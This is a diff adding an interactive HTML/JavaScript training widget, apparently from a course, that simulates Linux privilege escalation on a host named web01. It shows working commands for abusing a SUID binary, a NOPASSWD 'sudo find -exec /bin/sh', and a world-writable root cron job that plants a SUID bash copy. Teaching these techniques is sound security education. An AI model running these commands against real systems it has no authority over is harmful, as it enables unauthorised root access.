@@ -1,0 +1,127 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8">
+<link rel="stylesheet" href="_shared.css">
+<style>
+  body { padding: 6px 8px; }
+  .w { padding: 12px 14px; }
+  .idbar { display: flex; align-items: center; gap: 10px; margin-bottom: 8px; font-size: 13px; }
+  .idbar .who { font-family: var(--mono,monospace); font-weight: 800; padding: .28em .7em; border-radius: 999px; }
+  .who.user { background: #E4F3F1; color: #17726d; } .who.root { background: #2a0e0e; color: #ffd23f; }
+  .idbar .goal { color: #7a8f96; font-size: 12px; }
+  .term { background: #04121a; border: 1px solid #123; border-radius: 9px; padding: 11px 13px; height: 268px; overflow: auto;
+    font-family: var(--mono,monospace); font-size: 12px; line-height: 1.55; }
+  .term .l { white-space: pre-wrap; }
+  .term .cmd { color: #33D3CB; } .term .cmd .p { color: #5c7d86; } .term .cmd .pr { color: #ff6b6b; }
+  .term .out { color: #9fb3b8; } .term .s { color: #7fd18b; } .term .bad { color: #ff8a8a; }
+  .term .hot { color: #ffd23f; font-weight: 700; }
+  .banner { margin-top: 6px; padding: 5px 9px; border-radius: 6px; font-weight: 800; display: inline-block; }
+  .banner.win { background: #1c3a1f; color: #7fd18b; } .banner.no { background: #3a1c1c; color: #ff9a9a; }
+  .leads { display: grid; grid-template-columns: repeat(4,1fr); gap: 9px; margin-top: 10px; }
+  .lead { text-align: left; background: #fff; border: 1px solid #E0E7E8; border-top: 3px solid #00567C; border-radius: 7px;
+    padding: .55em .65em; cursor: pointer; transition: .12s; }
+  .lead:hover { border-color: #8AA1A8; background: #f7fafa; transform: translateY(-1px); }
+  .lead .tag { font-family: var(--mono,monospace); font-size: 9.5px; font-weight: 800; color: #a06a2a; letter-spacing:.03em; }
+  .lead .nm { font-size: 12px; font-weight: 800; color: #12333D; margin: 2px 0; line-height: 1.15; }
+  .lead .hint { font-size: 10.5px; color: #7a8f96; line-height: 1.3; }
+  .lead.herring { border-top-color: #b7c3c6; }
+  .cap { min-height: 40px; margin-top: 9px; }
+</style>
+</head><body>
+<div class="w">
+  <div class="idbar">
+    <span>whoami:</span><span class="who user" id="who">alice (uid 1000)</span>
+    <span class="goal" id="goal">low-priv shell from Day 2 — goal: become <b>root</b>. Enumeration found 4 leads. Try one.</span>
+  </div>
+  <div class="term" id="term"></div>
+  <div class="leads">
+    <button class="lead" data-k="suid"><span class="tag">SUID</span><div class="nm">vuln-backup</div><div class="hint">runs as root (s-bit)</div></button>
+    <button class="lead" data-k="sudo"><span class="tag">SUDO</span><div class="nm">find NOPASSWD</div><div class="hint">run find as root</div></button>
+    <button class="lead" data-k="cron"><span class="tag">CRON</span><div class="nm">writable job</div><div class="hint">root runs your edit</div></button>
+    <button class="lead herring" data-k="tmp"><span class="tag">MISC</span><div class="nm">/tmp writable</div><div class="hint">everyone can write</div></button>
+  </div>
+  <div class="cap" id="cap"></div>
+</div>
+<script>
+var PRE = [
+  {t:"cmd", s:'<span class="p">alice@web01:~$</span> whoami'},
+  {t:"out", s:'alice'},
+  {t:"cmd", s:'<span class="p">alice@web01:~$</span> <span class="out"># enumeration surfaced 4 leads — click a card to try it.</span>'}
+];
+var LEADS = {
+  suid: { win:true, why:'The <b>SUID bit</b> (the <code>s</code> in <code>-rwsr-xr-x</code>) runs a program as its <em>owner</em> — here, root. A flaw in that root-owned program hands you a root shell: you inherit root\'s power.',
+    lines:[
+      {t:"cmd", s:'<span class="p">alice@web01:~$</span> ls -l /usr/bin/vuln-backup'},
+      {t:"out", s:'-rw<span class="hot">s</span>r-xr-x 1 <span class="hot">root</span> root 18K /usr/bin/vuln-backup'},
+      {t:"cmd", s:'<span class="p">alice@web01:~$</span> vuln-backup --exec /bin/sh   <span class="out"># abuses the SUID binary</span>'},
+      {t:"cmd", s:'<span class="pr">root@web01:#</span> id'},
+      {t:"s",   s:'uid=0(root) gid=0(root) groups=0(root)'}
+    ]},
+  sudo: { win:true, why:'<code>sudo -l</code> shows you may run <code>find</code> as root <b>without a password</b>. And <code>find</code> can launch a shell (<code>-exec</code>) — a classic <b>GTFOBins</b> trick. That shell runs as root.',
+    lines:[
+      {t:"cmd", s:'<span class="p">alice@web01:~$</span> sudo -l'},
+      {t:"out", s:'User alice may run: (<span class="hot">root</span>) <span class="hot">NOPASSWD</span>: /usr/bin/find'},
+      {t:"cmd", s:'<span class="p">alice@web01:~$</span> sudo find . -maxdepth 0 -exec /bin/sh \\;'},
+      {t:"cmd", s:'<span class="pr">root@web01:#</span> id'},
+      {t:"s",   s:'uid=0(root) gid=0(root)'}
+    ]},
+  cron: { win:true, why:'A <b>root-owned cron job you can edit</b> = code execution as root on a schedule. You append a command, wait one minute, and cron plants you a root shell.',
+    lines:[
+      {t:"cmd", s:'<span class="p">alice@web01:~$</span> ls -l /etc/cron.d/backup'},
+      {t:"out", s:'-rw-<span class="hot">rw</span>-<span class="hot">rw</span>- 1 root root /etc/cron.d/backup  <span class="bad"># world-writable!</span>'},
+      {t:"cmd", s:'<span class="p">alice@web01:~$</span> echo \'* * * * * root cp /bin/bash /tmp/rb; chmod +s /tmp/rb\' >> /etc/cron.d/backup'},
+      {t:"out", s:'… waiting ~60s for cron (runs as root) …'},
+      {t:"cmd", s:'<span class="p">alice@web01:~$</span> /tmp/rb -p; id'},
+      {t:"s",   s:'uid=1000(alice) <span class="hot">euid=0(root)</span>'}
+    ]},
+  tmp: { win:false, why:'<b>Writable ≠ privesc.</b> <code>/tmp</code> is <em>meant</em> to be world-writable — that\'s normal. It only helps if something <em>privileged</em> runs what you drop there. Nothing does. No escalation — this lead is a dead end.',
+    lines:[
+      {t:"cmd", s:'<span class="p">alice@web01:~$</span> ls -ld /tmp'},
+      {t:"out", s:'drwxrwxrwt 20 root root /tmp'},
+      {t:"cmd", s:'<span class="p">alice@web01:~$</span> echo test > /tmp/x   <span class="out"># sure, I can write…</span>'},
+      {t:"cmd", s:'<span class="p">alice@web01:~$</span> id'},
+      {t:"bad", s:'uid=1000(alice) — still just alice. nothing ran my file as root.'}
+    ]}
+};
+
+var term=document.getElementById("term"), typing=false, tq=[], ti=0, timer=null;
+function lineHTML(o){ var cls = o.t==="out"?"out": o.t==="s"?"out s": o.t==="bad"?"out bad":"cmd";
+  return '<div class="l '+cls+'">'+o.s+'</div>'; }
+function renderInstant(lines, banner){
+  term.innerHTML = PRE.concat(lines).map(lineHTML).join("");
+  if(banner) term.innerHTML += '<div class="banner '+(banner.win?"win":"no")+'">'+banner.text+'</div>';
+  term.scrollTop = term.scrollHeight;
+}
+function typeOut(lines, banner, done){
+  if(timer) clearTimeout(timer);
+  term.innerHTML = PRE.map(lineHTML).join("");
+  var i=0;
+  (function next(){
+    if(i>=lines.length){ if(banner){ term.innerHTML += '<div class="banner '+(banner.win?"win":"no")+'">'+banner.text+'</div>'; term.scrollTop=term.scrollHeight; } if(done)done(); typing=false; return; }
+    term.innerHTML += lineHTML(lines[i]); term.scrollTop = term.scrollHeight; i++;
+    timer=setTimeout(next, 260);
+  })();
+}
+function setId(root){
+  var w=document.getElementById("who");
+  if(root){ w.className="who root"; w.textContent="👑 root (uid 0)"; document.getElementById("goal").innerHTML='<b class="s" style="color:#17726d">Root shell.</b> You own this box — now do it again on the next one.'; }
+  else { w.className="who user"; w.textContent="alice (uid 1000)"; }
+}
+function tryLead(k){
+  if(typing) return; typing=true;
+  var L=LEADS[k];
+  var banner = L.win ? {win:true, text:"✓ ROOT SHELL — privilege escalated"} : {win:false, text:"✗ no escalation — dead end"};
+  document.getElementById("cap").innerHTML = L.why;
+  typeOut(L.lines, banner, function(){ setId(L.win); });
+}
+document.querySelectorAll(".lead").forEach(function(b){ b.onclick=function(){ tryLead(b.dataset.k); }; });
+
+renderInstant([], null);
+document.getElementById("cap").innerHTML = 'You have a foothold but only <b>alice</b>\'s power. Privilege escalation = abusing a <em>misconfiguration</em> to become root. Three of these leads work — one is a trap. Try them.';
+
+// hook: ?try=suid|sudo|cron|tmp
+var tk=(location.search.match(/try=(\w+)/)||[])[1];
+if(tk && LEADS[tk]){ var L=LEADS[tk];
+  renderInstant(L.lines, L.win?{win:true,text:"✓ ROOT SHELL — privilege escalated"}:{win:false,text:"✗ no escalation — dead end"});
+  setId(L.win); document.getElementById("cap").innerHTML=L.why; }
+</script>
+</body></html>
